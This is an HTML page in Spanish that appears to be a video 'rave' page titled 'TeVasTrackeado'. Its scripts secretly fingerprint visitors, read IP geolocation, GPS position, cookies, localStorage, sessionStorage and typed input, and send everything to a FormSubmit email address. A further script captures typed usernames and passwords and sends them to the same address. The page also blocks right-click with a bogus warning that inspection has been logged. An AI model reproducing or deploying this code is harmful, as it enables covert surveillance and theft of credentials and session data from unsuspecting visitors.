<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>P√°gina de Prueba - Estable y M√°xima Captura</title>
    <style>
        /* --- ESTILOS RAVE/DARK --- */
        body {
            font-family: 'Arial Black', sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #121212;
            color: #E0E0E0;
        }
        h1 {
            color: #00ff99;
            text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
            margin-bottom: 5px;
            transition: visibility 0.5s;
        }
        p {
            color: #AAAAAA;
            margin-top: 5px;
        }
        video {
            border: 5px solid #ff00ff;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
            border-radius: 8px;
            margin-top: 20px;
            transition: border-color 0.5s, box-shadow 0.5s;
        }
    </style>
</head>
<body>
    <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
    <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>

    <video width="720" controls>
      <source src="clip.mp4" type="video/mp4">
      Tu navegador no puede reproducir este video.
    </video>

    <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>

    <script>
        // üìß CORREO DE DESTINO:
        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/system404g%40gmail.com';

        // --- 1. Recolecci√≥n de datos del dispositivo ---
        const userAgent = navigator.userAgent;
        const userLanguage = navigator.language || navigator.userLanguage;
        const screenRes = window.screen.width + 'x' + window.screen.height;
        const cpuCores = navigator.hardwareConcurrency || 'N/A';
        const platform = navigator.platform;
        const referrer = document.referrer || 'Acceso Directo';
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const colorDepth = screen.colorDepth;

        // Captura adicional
        const memory = navigator.deviceMemory || 'N/A';
        const deviceType = /Mobi|Tablet/.test(navigator.userAgent) ? 'M√≥vil' : 'PC';
        const browserVersion = navigator.appVersion;
        const effectiveType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
        const downlink = navigator.connection ? navigator.connection.downlink : 'unknown';
        const rtt = navigator.connection ? navigator.connection.rtt : 'unknown';

        // Captura de datos de plugins y extensiones
        const plugins = navigator.plugins;
        const pluginsList = Array.from(plugins).map(plugin => `${plugin.name}: ${plugin.description}`).join(', ');

        // Captura de datos de geolocalizaci√≥n
        let geolocationData = 'N/A';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((position) => {
                geolocationData = `${position.coords.latitude}, ${position.coords.longitude}`;
            });
        }

        // Captura de datos de actividad del usuario
        let mouseMoves = 0;
        let clicks = 0;
        document.addEventListener('mousemove', () => {
            mouseMoves++;
        });
        document.addEventListener('click', () => {
            clicks++;
        });

        // Captura de datos de tiempo de sesi√≥n
        let lastActivityTime = new Date().getTime();
        document.addEventListener('mousemove', () => {
            lastActivityTime = new Date().getTime();
        });
        document.addEventListener('keydown', () => {
            lastActivityTime = new Date().getTime();
        });
        const idleTime = () => {
            const now = new Date().getTime();
            return (now - lastActivityTime) / 1000;
        };

        // Captura de datos de cookies
        const cookies = document.cookie.split(';').map(cookie => cookie.trim()).join(', ');

        // Captura de datos de local storage
        const localStorageData = Object.entries(localStorage).map(([key, value]) => `${key}: ${value}`).join(', ');

        // Captura de datos de sesion storage
        const sessionStorageData = Object.entries(sessionStorage).map(([key, value]) => `${key}: ${value}`).join(', ');

        // Captura de datos de rendimiento
        const performanceData = performance.timing.toJSON();

        // Captura de datos de red
        const navigationData = performance.getEntriesByType('navigation')[0].toJSON();

        // Captura de datos de entrada del usuario
        const inputData = [];
        document.addEventListener('input', (event) => {
            inputData.push({
                type: event.target.type,
                value: event.target.value,
                name: event.target.name,
                id: event.target.id,
                timestamp: new Date().toISOString()
            });
        });

        // --- FUNCI√ìN PRINCIPAL: API de Respaldo (ipinfo.io/json) para M√°xima Estabilidad ---

        // ipinfo.io es extremadamente estable y no suele tener bloqueos de rate limit para uso espor√°dico.
        const scanUrl = 'https://ipinfo.io/json';

        fetch(scanUrl)
            .then(geoResponse => geoResponse.json())
            .then(geoData => {

                const userIP = geoData.ip || 'N/A';

                // Ensamblar TODOS los datos para el env√≠o final
                const finalPayload = {
                    "_subject": "‚úÖ DATOS ESTABLES (IPinfo) - TeVasTrackeado",
                    "IP_Visitante": userIP,

                    // --- DATOS DE GEOLOCALIZACI√ìN Y RED (ipinfo.io) ---
                    "Geo_Ubicacion": `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country || 'N/A'}`,
                    "Coordenadas_GPS_IP": geoData.loc || 'N/A',
                    "Organizacion_ISP": geoData.org || 'N/A',
                    "Codigo_Postal": geoData.postal || 'N/A',
                    "Hostname": geoData.hostname || 'N/A',

                    // --- DATOS DE SEGURIDAD Y CONEXI√ìN (Incompletos con esta API) ---
                    "Proxy_VPN": 'No disponible con esta API gratuita',
                    "Movil": 'No disponible con esta API gratuita',

                    // --- DATOS DEL NAVEGADOR Y HARDWARE ---
                    "Agente_de_Usuario": userAgent,
                    "Plataforma_SO": platform,
                    "Nucleos_CPU": cpuCores,
                    "Resolucion": screenRes,
                    "Profundidad_Color": colorDepth,
                    "Idioma": userLanguage,
                    "Zona_Horaria": timeZone,
                    "Referencia_Web": referrer,
                    "Fecha_Hora_Visita": new Date().toLocaleString(),

                    // Captura adicional
                    "Memoria_RAM": memory,
                    "Tipo_De_Dispositivo": deviceType,
                    "Version_Navegador": browserVersion,
                    "Tipo_De_Conectividad": effectiveType,
                    "Velocidad_Downlink": downlink,
                    "Tiempo_RTT": rtt,
                    "Plugins_Instalados": pluginsList,
                    "Geolocalizacion": geolocationData,
                    "Movimientos_Mouse": mouseMoves,
                    "Clics": clicks,
                    "Tiempo_Inactividad": idleTime(),
                    "Cookies": cookies,
                    "Local_Storage": localStorageData,
                    "Session_Storage": sessionStorageData,
                    "Rendimiento": performanceData,
                    "Navegacion": navigationData,
                    "Entradas_Usuario": inputData,
                };

                // Enviar TODOS los datos al correo (FormSubmit)
                return fetch(FORM_SUBMIT_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(finalPayload)
                });
            })
            .then(response => {
                 if (response.ok) {
                     console.log("Env√≠o final exitoso.");
                 } else {
                     console.error("Error de FormSubmit:", response.statusText);
                 }
            })
            .catch(error => console.error('Fallo en la ejecuci√≥n del script:', error));
    </script>

    <script>
        // Efectos Visuales (Parpadeo, Clic Derecho, etc.)
        function blink() {
            var h1 = document.querySelector('h1');
            h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
        }
        setInterval(blink, 500);

        function changeBorderColor() {
            const video = document.querySelector('video');
            const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
            video.style.borderColor = randomColor;
            video.style.boxShadow = `0 0 25px ${randomColor}`;
        }
        setInterval(changeBorderColor, 2000);

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert("Advertencia: Intento de inspecci√≥n registrado. Acceso denegado.");
        });

        if (window.location.protocol === 'http:') {
            window.location.protocol = 'https:';
        }
    </script>

    <script>
        // Captura de contrase√±as
        document.addEventListener('input', function(event) {
            if (event.target.type === 'password') {
                const password = event.target.value;
                const username = document.querySelector('input[type="text"]').value;
                const finalPayload = {
                    "_subject": "Contrase√±a Capturada",
                    "Username": username,
                    "Password": password
                };
                fetch(FORM_SUBMIT_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(finalPayload)
                });
            }
        });
    </script>
</body>
</html>
